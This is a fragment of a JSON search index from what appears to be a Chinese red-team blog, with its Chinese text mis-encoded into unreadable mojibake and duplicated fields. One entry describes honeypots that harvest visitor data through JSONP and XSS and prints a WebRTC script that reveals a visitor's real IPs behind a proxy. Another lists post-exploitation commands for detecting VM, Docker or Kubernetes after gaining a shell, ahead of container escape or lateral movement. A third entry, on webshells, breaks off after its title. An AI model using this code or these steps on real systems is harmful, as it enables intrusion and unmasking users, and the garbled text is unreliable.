å’Œä¸Šé¢çš„jsonpè·¨åŸŸè¯·æ±‚åŒç†ï¼Œèœœç½å¯ä»¥é€šè¿‡jsonpè·¨åŸŸä¸»åŠ¨è·å–è®¿é—®è€…çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç”¨æˆ·åœ¨å…¶ä»–å·²ç™»é™†ç½‘ç«™ä¸Šçš„ç”¨æˆ·åã€æ‰‹æœºå·ã€IP\nä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼š\nä¸€éƒ¨åˆ†èœœç½ä¼šåœ¨èµ„æºä¸­åŠ è½½/js/portrait.jsï¼š\næˆ‘åœ¨ä½¿ç”¨fofaè¯­æ³•body=\u0026quot;/js/portrait.js\u0026quot; \u0026amp;\u0026amp; country=\u0026quot;CN\u0026quot;è¿›è¡Œæœç´¢åæ‰¾åˆ°ä¸€ä¸ªçœ‹ä¼¼åå°çš„ç½‘é¡µï¼š\nè¿™é‡Œå°±å¯ä»¥ç”¨æˆ‘ä»¬çš„burpæ¥ç®€å•è¾¨åˆ«æ˜¯å¦ä¸ºèœœç½ï¼Œè¯·æ±‚ç½‘é¡µåæŸ¥çœ‹burpçš„http historyï¼š\nå‘ç°åœ¨åŠ è½½ç½‘ç«™ä¸Šçš„è¿™ä¸ª/js/portrait.jsåï¼Œå°±å¼€å§‹ä¸æ–­çš„è¯·æ±‚å…¶ä»–å¸¸ç”¨ç¤¾äº¤åª’ä½“ç½‘ç«™ï¼š\nå¯ä»¥çœ‹åˆ°ï¼šQQã€æœç‹—ã€æ–°æµªã€æœç‹ç­‰çš„ç½‘ç«™éƒ½æœ‰è¢«è¯·æ±‚ï¼Œå†ä»”ç»†çœ‹çœ‹è¿™äº›è¯·æ±‚åŒ…ï¼š\nqqï¼š\næœç‹—ï¼š\næ–°æµªï¼š\nè¿™é‡Œç®€å•åˆ—ä¸¾ä¸‰ä¸ªè¯·æ±‚åŒ…ï¼Œå¾ˆæ˜æ˜¾éƒ½å­˜åœ¨callbackå‚æ•°ï¼Œå¾ˆç»å…¸çš„jsonpè·¨åŸŸè¯·æ±‚äº†\nå¹¶ä¸”è¿™é‡Œçš„jsonpå›è°ƒå‡½æ•°æ ¼å¼éƒ½æ˜¯jsonp_callback_+æŸå­—ç¬¦ä¸²ï¼Œçœ‹çœ‹/js/portrait.jsï¼š\næœç„¶å‡ºç°äº†è¿™æ ·çš„ä»£ç ï¼Œç°åœ¨å¯ä»¥æ–­å®šè¿™ä¸ªç½‘é¡µå°±æ˜¯ä¸€ä¸ªèœœç½\nXSSèœœç½ XSSçš„åŸç†å°±ä¸è¿‡å¤šè§£é‡Šäº†\nè¿™é‡Œç¬”è€…ç†è§£çš„XSSèœœç½å°±æ˜¯å°†å­˜åœ¨XSSæ¼æ´çš„URLå­˜æ”¾åœ¨ç½‘é¡µä¸­ï¼Œæ¸—é€æµ‹è¯•äººå‘˜ç‚¹å‡»åå°±ä¼šè§¦å‘XSS\nåˆ©ç”¨æ–¹å¼å’Œå¸¸è§„XSSçš„åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œè¿™é‡Œç»™å‡ºä¸€ç§è·å–æ”»å‡»è€…IPçš„æ¡ˆä¾‹\nWebRTCè·å–IP WebRTCæ˜¯ä¸€ä¸ªå¾ˆè€çš„æŠ€æœ¯ï¼Œä½†æ˜¯å¾ˆå°‘æœ‰äººå…³æ³¨ï¼Œç°ä»£æµè§ˆå™¨åŸºæœ¬éƒ½æ”¯æŒå¹¶é»˜è®¤å¼€å¯ï¼Œå¦‚æœæœªæ›¾å…³é—­ï¼Œåˆ™å¯èƒ½ä¼šæš´éœ²ä½ çš„çœŸå®IPï¼Œå³ä½¿ä½ å¼€çš„æ˜¯å…¨å±€ä»£ç†\nå¯ä»¥ä½¿ç”¨è¿™ä¸ªç½‘ç«™è¿›è¡Œæ£€æµ‹https://ip8.com/webrtc-testï¼Œç¬”è€…ä¹Ÿä¸­æ‹›äº†ï¼š\nè€Œä¸Šé¢è¿™ä¸ªæŠ€æœ¯ä»…é€šè¿‡javascriptä»£ç å³å¯å®ç°ï¼Œè¿™äº›jsä»£ç å¯èƒ½ä¼šè¢«æ’å…¥åˆ°ç½‘ç«™ä¸­è¿›è¡ŒXSSåˆ©ç”¨\nä¸‹é¢ç»™å‡ºä¸€æ®µæµ‹è¯•ä»£ç ï¼š\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Get IP Addresses\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://unpkg.com/element-ui@2.15.6/lib/theme-chalk/index.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/vue@2.6.14\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://unpkg.com/element-ui@2.15.6/lib/index.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;el-container\u0026gt; \u0026lt;el-header\u0026gt; \u0026lt;h1\u0026gt;Your IP Addresses:\u0026lt;/h1\u0026gt; \u0026lt;/el-header\u0026gt; \u0026lt;el-main\u0026gt; \u0026lt;el-table :data=\u0026#34;ipAddresses\u0026#34; style=\u0026#34;width: 100%\u0026#34; border\u0026gt; \u0026lt;el-table-column prop=\u0026#34;type\u0026#34; label=\u0026#34;Type\u0026#34; width=\u0026#34;180\u0026#34;\u0026gt;\u0026lt;/el-table-column\u0026gt; \u0026lt;el-table-column prop=\u0026#34;address\u0026#34; label=\u0026#34;IP Address\u0026#34;\u0026gt;\u0026lt;/el-table-column\u0026gt; \u0026lt;/el-table\u0026gt; \u0026lt;/el-main\u0026gt; \u0026lt;/el-container\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; new Vue({ el: \u0026#39;#app\u0026#39;, data() { return { ipAddresses: [ { type: \u0026#39;XFF or CDN IP Address\u0026#39;, address: \u0026#39;Loading...\u0026#39; }, { type: \u0026#39;WebRTC Local IP Address\u0026#39;, address: \u0026#39;Loading...\u0026#39; }, { type: \u0026#39;WebRTC IPv4 Address\u0026#39;, address: \u0026#39;Loading...\u0026#39; }, { type: \u0026#39;WebRTC IPv6 Address\u0026#39;, address: \u0026#39;Loading...\u0026#39; } ] }; }, mounted() { // Fetch XFF or CDN IP address const xhr = new XMLHttpRequest(); xhr.open(\u0026#39;GET\u0026#39;, \u0026#39;get_real_ip.php\u0026#39;, true); xhr.onreadystatechange = () =\u0026gt; { if (xhr.readyState === 4 \u0026amp;\u0026amp; xhr.status === 200) { const jsonResponse = JSON.parse(xhr.responseText); this.ipAddresses[0].address = jsonResponse.ip; } }; xhr.send(); // WebRTC IPs const iceServers = [ { urls: \u0026#39;stun:stun.l.google.com:19302\u0026#39; }, { urls: \u0026#39;stun:stun1.l.google.com:19302\u0026#39; }, { urls: \u0026#39;stun:stun2.l.google.com:19302\u0026#39; }, { urls: \u0026#39;stun:stun3.l.google.com:19302\u0026#39; }, { urls: \u0026#39;stun:stun4.l.google.com:19302\u0026#39; }, ]; // getUserIPs function function getUserIPs(callback) { const myPeerConnection = new RTCPeerConnection({ iceServers }); myPeerConnection.createDataChannel(\u0026#34;\u0026#34;); myPeerConnection.createOffer().then(offer =\u0026gt; myPeerConnection.setLocalDescription(offer)); myPeerConnection.onicecandidate = function(event) { if (event.candidate) { const parts = event.candidate.candidate.split(\u0026#39; \u0026#39;); const ip = parts[4]; callback(ip); } }; } getUserIPs((ip) =\u0026gt; { // ... (same as before) const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/; const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}(([0-9a-fA-F]{1,4}:){1,4}|((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/; if (ipv4Regex.test(ip)) { this.ipAddresses[2].address = ip; } else if (ipv6Regex.test(ip)) { this.ipAddresses[3].address = ip; } else { this.ipAddresses[1].address = ip; } }); } }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æœ¬åœ°æ­å»ºå³å¯æµ‹è¯•ï¼š\n"
    }
,
    {
        "title": "è¯†åˆ«è™šæ‹Ÿæœºã€Dockerå’ŒK8sé›†ç¾¤ç¯å¢ƒ",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/",
        "content": "è¯†åˆ«è™šæ‹Ÿæœºã€Dockerå’ŒK8sé›†ç¾¤ç¯å¢ƒ ä¸€ã€åŸºç¡€ éšç€äº‘åŸç”Ÿåº”ç”¨ä¸æ–­æ™®åŠï¼Œåœ¨æˆ‘ä»¬getshellä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦åˆ¤æ–­è¯¥shellæ˜¯å¦å¤„äºè™šæ‹Ÿç¯å¢ƒä¸­ï¼Œå¹¶åˆ¤æ–­è¯¥è™šæ‹Ÿç¯å¢ƒçš„ç±»å‹ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œshellçš„è™šæ‹Ÿç¯å¢ƒå¯èƒ½æœ‰å¦‚ä¸‹ä¸‰ä¸ªç±»å‹ï¼š\nè™šæ‹Ÿæœº è™šæ‹Ÿæœºæ˜¯æŒ‡åœ¨ä¸€å°ç‰©ç†æœåŠ¡å™¨ä¸Šè¿è¡Œçš„å¤šä¸ªè™šæ‹Ÿä¸»æœºå®ä¾‹ï¼Œæ¯ä¸ªè™šæ‹Ÿä¸»æœºå®ä¾‹éƒ½æ‹¥æœ‰è‡ªå·±çš„ç¯å¢ƒå’Œèµ„æºï¼Œé€šå¸¸ç”¨äºæä¾›Webæ‰˜ç®¡æœåŠ¡\nDocker Dockeræ˜¯ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œåˆ©ç”¨å®¹å™¨åŒ–çš„æ–¹å¼å°†åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–é¡¹æ‰“åŒ…æˆç‹¬ç«‹ã€è½»é‡çº§çš„ç¯å¢ƒï¼Œå®ç°å¿«é€Ÿéƒ¨ç½²ã€é«˜æ•ˆè¿è¡Œå’Œè·¨å¹³å°è¿è¡Œçš„åŠŸèƒ½\nK8s Kubernetesï¼ˆé€šå¸¸ç®€å†™ä¸ºK8sï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„å®¹å™¨ç¼–æ’å¹³å°ï¼Œé€šè¿‡è‡ªåŠ¨åŒ–éƒ¨ç½²ã€æ‰©å±•å’Œç®¡ç†å®¹å™¨åŒ–åº”ç”¨ï¼Œå®ç°é«˜å¯ç”¨æ€§ã€å¼¹æ€§å’Œçµæ´»æ€§ã€‚å®ƒæä¾›äº†é›†ç¾¤ç®¡ç†ã€æœåŠ¡å‘ç°ã€è´Ÿè½½å‡è¡¡ç­‰åŠŸèƒ½ï¼Œè®©ç”¨æˆ·å¯ä»¥æ›´è½»æ¾åœ°ç®¡ç†å®¹å™¨åŒ–åº”ç”¨çš„ç”Ÿå‘½å‘¨æœŸ\näºŒã€æ€è·¯ å¦‚æœshellå¤„äºè™šæ‹Ÿæœºã€Dockeræˆ–K8sé›†ç¾¤ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç¯å¢ƒè¿›è¡Œè¯†åˆ«ï¼Œå¹¶é‡‡å–é’ˆå¯¹æ€§çš„æªæ–½ï¼Œæ¯”å¦‚ï¼š\nè™šæ‹Ÿæœºï¼šé€šå¸¸è€ƒè™‘æ¨ªå‘ç§»åŠ¨æ¥æ‰©å¤§æ”»å‡»æ•ˆæœ\nDockerï¼šé€šå¸¸å…ˆè¿›è¡Œå®¹å™¨é€ƒé€¸ï¼Œå†è¿›è¡Œå†…ç½‘æ¨ªå‘ç§»åŠ¨\nK8sï¼šé€šå¸¸å…ˆå°è¯•æ¥ç®¡é›†ç¾¤ï¼Œä»¥è·å–å¯¹å®¹å™¨å’Œé›†ç¾¤èµ„æºçš„å®Œå…¨æ§åˆ¶\nä¸‰ã€è¯†åˆ« é¦–å…ˆåˆ¤æ–­å½“å‰shellæ˜¯å¦é‡‡ç”¨äº†è™šæ‹ŸåŒ–æŠ€æœ¯ï¼š\nsystemd-detect-virt\t#è¯†åˆ«ç³»ç»Ÿè™šæ‹Ÿæœºï¼ˆVMï¼‰ã€å®¹å™¨è¿˜æ˜¯è£¸æœºä¸Šè¿è¡Œ åœ¨ç¡®è®¤é‡‡ç”¨äº†è™šæ‹ŸåŒ–æŠ€æœ¯åï¼Œå¸¸æœ‰å¦‚ä¸‹æ£€æµ‹æ–¹æ³•å¯ä»¥å¿«é€Ÿè¯†åˆ«å½“å‰æ‰€å¤„ç¯å¢ƒç±»å‹\næŸ¥çœ‹ä¸»æœºåå’Œè¿›ç¨‹ å®¹å™¨çš„ä¸»æœºåé»˜è®¤éšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼ŒPID1éç³»ç»Ÿè¿›ç¨‹ï¼Œå¯åˆæ­¥åˆ¤æ–­å½“å‰ä¸ºå®¹å™¨ç¯å¢ƒ\nhostname\t#æŸ¥çœ‹ä¸»æœºå ps aux\t#æ˜¾ç¤ºç³»ç»Ÿä¸Šæ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†è¿›ç¨‹ä¿¡æ¯ é€šè¿‡åˆ©ç”¨cgroupä¿¡æ¯çš„å·®å¼‚ é€šè¿‡æŸ¥çœ‹cgroupä¿¡æ¯ï¼Œå¯ä»¥åˆ¤æ–­å½“å‰ç¯æ˜¯å¦æ˜¯è™šæ‹Ÿæœºã€Dockerå®¹å™¨æˆ–K8sé›†ç¾¤:\ncat /proc/1/cgroup\t#ç”¨äºæŸ¥çœ‹è¿›ç¨‹IDä¸º1çš„ç³»ç»Ÿè¿›ç¨‹ï¼ˆé€šå¸¸æ˜¯Initè¿›ç¨‹ï¼‰æ‰€å±çš„cgroupä¿¡æ¯ï¼Œå³ç”¨äºæ§åˆ¶å’Œç®¡ç†è¿›ç¨‹èµ„æºä½¿ç”¨çš„å®¹å™¨æŠ€æœ¯ ä¹Ÿå¯ä»¥é’ˆå¯¹æ€§çš„æŸ¥æ‰¾å…³é”®è¯ï¼Œä¾‹å¦‚é’ˆå¯¹Dockerå­—ç¬¦ä¸²ï¼š\ngrep \u0026#39;docker\u0026#39; /proc/1/cgroup\t#æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨â€˜Dockerâ€™å­—ç¬¦ä¸² æ£€æŸ¥æ ¹ç›®å½•ä¸‹.dockerenvæ–‡ä»¶\né€šè¿‡åˆ¤æ–­æ ¹ç›®å½•ä¸‹çš„.dockerenvæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œç¡®è®¤å½“å‰ç¯æ˜¯å¦ä¸ºå®¹å™¨ç¯å¢ƒ:\nls -alh/dockerenv\t#åˆ—å‡º/dockerenvç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ï¼Œå¹¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ä»¥åŠäººç±»å¯è¯»çš„æ–‡ä»¶å¤§å° é€šè¿‡æ£€æŸ¥æŒ‚è½½ä¿¡æ¯\né€šè¿‡æ£€æŸ¥æŒ‚è½½ä¿¡æ¯ï¼Œæ¨æµ‹å½“å‰ç¯å¢ƒæ˜¯è™šæ‹Ÿæœºã€Dockerå®¹å™¨è¿˜æ˜¯K8sé›†ç¾¤:\nmount lgrep \u0026#39;/type\u0026#39;\t#ä»å½“å‰ç³»ç»Ÿä¸­åˆ—å‡ºæ‰€æœ‰å·²æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä½¿ç”¨grepå‘½ä»¤ç­›é€‰å‡ºåŒ…å«/typeè·¯å¾„çš„æŒ‚è½½ä¿¡æ¯ æŸ¥çœ‹ç¡¬ç›˜ä¿¡æ¯\né€šè¿‡æŸ¥çœ‹ç¡¬ç›˜ä¿¡æ¯ï¼Œæ¨æ–­å½“å‰ç¯å¢ƒæ˜¯å¦ä¸ºå®¹å™¨ç¯å¢ƒ:\nfdisk -l #åˆ—å‡ºç³»ç»Ÿä¸Šæ‰€æœ‰ç£ç›˜çš„åˆ†åŒºä¿¡æ¯ è·å–å½“å‰ç¯å¢ƒçš„æ–‡ä»¶ç³»ç»Ÿå’ŒæŒ‚è½½ç‚¹ä¿¡æ¯\nè·å–å½“å‰ç¯å¢ƒçš„æ–‡ä»¶ç³»ç»Ÿå’ŒæŒ‚è½½ç‚¹ä¿¡æ¯ï¼Œç”¨æ¥åˆ¤æ–­æ˜¯å¦å®¹å™¨ç¯å¢ƒ:\ndf -h\t#æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜ä½¿ç”¨æƒ…å†µå’ŒæŒ‚è½½ç‚¹ä¿¡æ¯ é€šè¿‡äº†è§£ç¯å¢ƒå˜é‡åŒ…å«çš„ä¿¡æ¯\né€šè¿‡æ£€æŸ¥ç¯å¢ƒå˜é‡ï¼Œäº†è§£ç‰¹å®šç¯å¢ƒçš„ä¿¡æ¯:\nenv #æ˜¾ç¤ºå½“å‰ç³»ç»Ÿç¯å¢ƒä¸­çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ å››ã€ååˆ¶ å¯¹äºé˜²å®ˆè€…è€Œè¨€ï¼Œé€šè¿‡äº†è§£æ”»å‡»è€…åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­å¯èƒ½é‡‡å–çš„è¿™äº›ä¿¡æ¯æ¢æµ‹è¡Œä¸ºï¼Œå¯ä»¥å»ºç«‹æœ‰æ•ˆçš„å‘Šè­¦æœºåˆ¶ï¼Œä»¥ä¾¿åŠæ—©å‘ç°æ½œåœ¨çš„æ”»å‡»è¡Œä¸º\n",
        "summary": "è¯†åˆ«è™šæ‹Ÿæœºã€Dockerå’ŒK8sé›†ç¾¤ç¯å¢ƒ ä¸€ã€åŸºç¡€ éšç€äº‘åŸç”Ÿåº”ç”¨ä¸æ–­æ™®åŠï¼Œåœ¨æˆ‘ä»¬getshellä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦åˆ¤æ–­è¯¥shellæ˜¯å¦å¤„äºè™šæ‹Ÿç¯å¢ƒä¸­ï¼Œå¹¶åˆ¤æ–­è¯¥è™šæ‹Ÿç¯å¢ƒçš„ç±»å‹ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œshellçš„è™šæ‹Ÿç¯å¢ƒå¯èƒ½æœ‰å¦‚ä¸‹ä¸‰ä¸ªç±»å‹ï¼š\nè™šæ‹Ÿæœº è™šæ‹Ÿæœºæ˜¯æŒ‡åœ¨ä¸€å°ç‰©ç†æœåŠ¡å™¨ä¸Šè¿è¡Œçš„å¤šä¸ªè™šæ‹Ÿä¸»æœºå®ä¾‹ï¼Œæ¯ä¸ªè™šæ‹Ÿä¸»æœºå®ä¾‹éƒ½æ‹¥æœ‰è‡ªå·±çš„ç¯å¢ƒå’Œèµ„æºï¼Œé€šå¸¸ç”¨äºæä¾›Webæ‰˜ç®¡æœåŠ¡\nDocker Dockeræ˜¯ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œåˆ©ç”¨å®¹å™¨åŒ–çš„æ–¹å¼å°†åº”ç”¨ç¨‹åºåŠå…¶ä¾èµ–é¡¹æ‰“åŒ…æˆç‹¬ç«‹ã€è½»é‡çº§çš„ç¯å¢ƒï¼Œå®ç°å¿«é€Ÿéƒ¨ç½²ã€é«˜æ•ˆè¿è¡Œå’Œè·¨å¹³å°è¿è¡Œçš„åŠŸèƒ½\nK8s Kubernetesï¼ˆé€šå¸¸ç®€å†™ä¸ºK8sï¼‰æ˜¯ä¸€ä¸ªå¼€æºçš„å®¹å™¨ç¼–æ’å¹³å°ï¼Œé€šè¿‡è‡ªåŠ¨åŒ–éƒ¨ç½²ã€æ‰©å±•å’Œç®¡ç†å®¹å™¨åŒ–åº”ç”¨ï¼Œå®ç°é«˜å¯ç”¨æ€§ã€å¼¹æ€§å’Œçµæ´»æ€§ã€‚å®ƒæä¾›äº†é›†ç¾¤ç®¡ç†ã€æœåŠ¡å‘ç°ã€è´Ÿè½½å‡è¡¡ç­‰åŠŸèƒ½ï¼Œè®©ç”¨æˆ·å¯ä»¥æ›´è½»æ¾åœ°ç®¡ç†å®¹å™¨åŒ–åº”ç”¨çš„ç”Ÿå‘½å‘¨æœŸ\näºŒã€æ€è·¯ å¦‚æœshellå¤„äºè™šæ‹Ÿæœºã€Dockeræˆ–K8sé›†ç¾¤ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç¯å¢ƒè¿›è¡Œè¯†åˆ«ï¼Œå¹¶é‡‡å–é’ˆå¯¹æ€§çš„æªæ–½ï¼Œæ¯”å¦‚ï¼š\nè™šæ‹Ÿæœºï¼šé€šå¸¸è€ƒè™‘æ¨ªå‘ç§»åŠ¨æ¥æ‰©å¤§æ”»å‡»æ•ˆæœ\nDockerï¼šé€šå¸¸å…ˆè¿›è¡Œå®¹å™¨é€ƒé€¸ï¼Œå†è¿›è¡Œå†…ç½‘æ¨ªå‘ç§»åŠ¨\nK8sï¼šé€šå¸¸å…ˆå°è¯•æ¥ç®¡é›†ç¾¤ï¼Œä»¥è·å–å¯¹å®¹å™¨å’Œé›†ç¾¤èµ„æºçš„å®Œå…¨æ§åˆ¶\nä¸‰ã€è¯†åˆ« é¦–å…ˆåˆ¤æ–­å½“å‰shellæ˜¯å¦é‡‡ç”¨äº†è™šæ‹ŸåŒ–æŠ€æœ¯ï¼š\nsystemd-detect-virt\t#è¯†åˆ«ç³»ç»Ÿè™šæ‹Ÿæœºï¼ˆVMï¼‰ã€å®¹å™¨è¿˜æ˜¯è£¸æœºä¸Šè¿è¡Œ åœ¨ç¡®è®¤é‡‡ç”¨äº†è™šæ‹ŸåŒ–æŠ€æœ¯åï¼Œå¸¸æœ‰å¦‚ä¸‹æ£€æµ‹æ–¹æ³•å¯ä»¥å¿«é€Ÿè¯†åˆ«å½“å‰æ‰€å¤„ç¯å¢ƒç±»å‹\næŸ¥çœ‹ä¸»æœºåå’Œè¿›ç¨‹ å®¹å™¨çš„ä¸»æœºåé»˜è®¤éšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼ŒPID1éç³»ç»Ÿè¿›ç¨‹ï¼Œå¯åˆæ­¥åˆ¤æ–­å½“å‰ä¸ºå®¹å™¨ç¯å¢ƒ\nhostname\t#æŸ¥çœ‹ä¸»æœºå ps aux\t#æ˜¾ç¤ºç³»ç»Ÿä¸Šæ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†è¿›ç¨‹ä¿¡æ¯ é€šè¿‡åˆ©ç”¨cgroupä¿¡æ¯çš„å·®å¼‚ é€šè¿‡æŸ¥çœ‹cgroupä¿¡æ¯ï¼Œå¯ä»¥åˆ¤æ–­å½“å‰ç¯æ˜¯å¦æ˜¯è™šæ‹Ÿæœºã€Dockerå®¹å™¨æˆ–K8sé›†ç¾¤:\ncat /proc/1/cgroup\t#ç”¨äºæŸ¥çœ‹è¿›ç¨‹IDä¸º1çš„ç³»ç»Ÿè¿›ç¨‹ï¼ˆé€šå¸¸æ˜¯Initè¿›ç¨‹ï¼‰æ‰€å±çš„cgroupä¿¡æ¯ï¼Œå³ç”¨äºæ§åˆ¶å’Œç®¡ç†è¿›ç¨‹èµ„æºä½¿ç”¨çš„å®¹å™¨æŠ€æœ¯ ä¹Ÿå¯ä»¥é’ˆå¯¹æ€§çš„æŸ¥æ‰¾å…³é”®è¯ï¼Œä¾‹å¦‚é’ˆå¯¹Dockerå­—ç¬¦ä¸²ï¼š\ngrep \u0026#39;docker\u0026#39; /proc/1/cgroup\t#æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨â€˜Dockerâ€™å­—ç¬¦ä¸² æ£€æŸ¥æ ¹ç›®å½•ä¸‹.dockerenvæ–‡ä»¶\né€šè¿‡åˆ¤æ–­æ ¹ç›®å½•ä¸‹çš„.dockerenvæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œç¡®è®¤å½“å‰ç¯æ˜¯å¦ä¸ºå®¹å™¨ç¯å¢ƒ:\nls -alh/dockerenv\t#åˆ—å‡º/dockerenvç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ï¼Œå¹¶æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ä»¥åŠäººç±»å¯è¯»çš„æ–‡ä»¶å¤§å° é€šè¿‡æ£€æŸ¥æŒ‚è½½ä¿¡æ¯\né€šè¿‡æ£€æŸ¥æŒ‚è½½ä¿¡æ¯ï¼Œæ¨æµ‹å½“å‰ç¯å¢ƒæ˜¯è™šæ‹Ÿæœºã€Dockerå®¹å™¨è¿˜æ˜¯K8sé›†ç¾¤:\nmount lgrep \u0026#39;/type\u0026#39;\t#ä»å½“å‰ç³»ç»Ÿä¸­åˆ—å‡ºæ‰€æœ‰å·²æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä½¿ç”¨grepå‘½ä»¤ç­›é€‰å‡ºåŒ…å«/typeè·¯å¾„çš„æŒ‚è½½ä¿¡æ¯ æŸ¥çœ‹ç¡¬ç›˜ä¿¡æ¯\né€šè¿‡æŸ¥çœ‹ç¡¬ç›˜ä¿¡æ¯ï¼Œæ¨æ–­å½“å‰ç¯å¢ƒæ˜¯å¦ä¸ºå®¹å™¨ç¯å¢ƒ:\nfdisk -l #åˆ—å‡ºç³»ç»Ÿä¸Šæ‰€æœ‰ç£ç›˜çš„åˆ†åŒºä¿¡æ¯ è·å–å½“å‰ç¯å¢ƒçš„æ–‡ä»¶ç³»ç»Ÿå’ŒæŒ‚è½½ç‚¹ä¿¡æ¯\nè·å–å½“å‰ç¯å¢ƒçš„æ–‡ä»¶ç³»ç»Ÿå’ŒæŒ‚è½½ç‚¹ä¿¡æ¯ï¼Œç”¨æ¥åˆ¤æ–­æ˜¯å¦å®¹å™¨ç¯å¢ƒ:\ndf -h\t#æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜ä½¿ç”¨æƒ…å†µå’ŒæŒ‚è½½ç‚¹ä¿¡æ¯ é€šè¿‡äº†è§£ç¯å¢ƒå˜é‡åŒ…å«çš„ä¿¡æ¯\né€šè¿‡æ£€æŸ¥ç¯å¢ƒå˜é‡ï¼Œäº†è§£ç‰¹å®šç¯å¢ƒçš„ä¿¡æ¯:\nenv #æ˜¾ç¤ºå½“å‰ç³»ç»Ÿç¯å¢ƒä¸­çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ å››ã€ååˆ¶ å¯¹äºé˜²å®ˆè€…è€Œè¨€ï¼Œé€šè¿‡äº†è§£æ”»å‡»è€…åœ¨äº‘åŸç”Ÿç¯å¢ƒä¸­å¯èƒ½é‡‡å–çš„è¿™äº›ä¿¡æ¯æ¢æµ‹è¡Œä¸ºï¼Œå¯ä»¥å»ºç«‹æœ‰æ•ˆçš„å‘Šè­¦æœºåˆ¶ï¼Œä»¥ä¾¿åŠæ—©å‘ç°æ½œåœ¨çš„æ”»å‡»è¡Œä¸º\n"
    }
,
    {
        "title": "è´Ÿè½½å‡è¡¡åœºæ™¯çš„webshellè¿æ¥",
        "link": "/My-Knowlege-Database/blog/rt%E6%8A%80%E6%88%98%E6%B3%95/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%9C%BA%E6%99%AF%E7%9A%84webshell%E8%BF%9E%E6%8E%A5/",
